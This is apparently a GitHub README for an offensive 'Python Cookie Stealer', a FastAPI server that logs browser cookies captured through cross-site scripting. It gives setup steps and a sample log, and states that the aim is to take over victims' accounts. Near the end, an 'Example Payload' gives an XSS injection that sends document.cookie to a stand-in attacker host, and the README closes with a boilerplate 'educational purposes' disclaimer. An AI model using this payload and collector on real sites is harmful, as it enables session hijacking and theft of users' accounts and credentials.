# Python Cookie Stealer
The Python cookie stealer is a tool that can be used in penetration testing and XSS attacks to steal browser cookies from victims. The tool works by setting up a server that listens for incoming requests with a specific cookie value. When a request is received, the tool logs various information about the request, including the date and time, client IP address, user agent, referer, and cookie value, to a file.

This tool can be used by attackers to steal sensitive information, such as session tokens and authentication credentials, from unsuspecting users. By stealing a user's browser cookies, an attacker can gain unauthorized access to the user's account and perform actions on their behalf.

## Usage

1. Clone Python Cookie Stealer Project
```
git clone https://github.com/TheWation/PythonCookieStealer
```

2. Install Python and FastAPI on your machine if you haven't already. You can download the latest version of Python from the official website: https://www.python.org/downloads/ and install FastAPI using pip:

```bash
pip install fastapi
```
3. Install uvicorn, a lightning-fast ASGI server, using pip:

```bash
pip install uvicorn
```

4. Create a new directory for your project and navigate into it using a terminal or command prompt.

5. Create a new file called main.py and copy the FastAPI code into it.

6. Start the FastAPI server by running the following command in the terminal or command prompt:

```bash
uvicorn main:app --reload
```

7. In your web browser, visit http://localhost:8000/c/your-cookie-value, replacing your-cookie-value with the value of the cookie that you want to log. For example, if the cookie value is ABC123, you would visit http://localhost:8000/c/ABC123.

8. The server will log the date and time, client IP address, user agent, referer, and cookie value to the cookies.txt file in the project directory.

```
[+] Date: 2022/10/03 15:30:45
[+] IP: 127.0.0.1
[+] UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
[+] Referer: http://localhost:8000/
[+] Cookies: ABC123
---
```

9. The server will also return a response with a status code of 200 if the request was successful, or a status code of 500 if there was an error writing to the file.

10. You can repeat step 6 with different cookie values to log additional data to the file.

11. To stop the server, press CTRL+C in the terminal where it is running.

## Example Payload
```
https://pentest.target/?name=<img src=x onerror=this.src='http://evil-website.com/c/'+document.cookie>
```

## Disclaimer
For educational purposes only. Do not use for illegal activities. Use at your own risk. By using this tool, you agree to comply with all applicable laws and regulations. Unauthorized use is strictly prohibited. Always obtain permission before using this tool. No warranties.

## License

`WebSecurityVision` is made with ♥  by [Wation](https://github.com/TheWation) and it's released under the MIT license.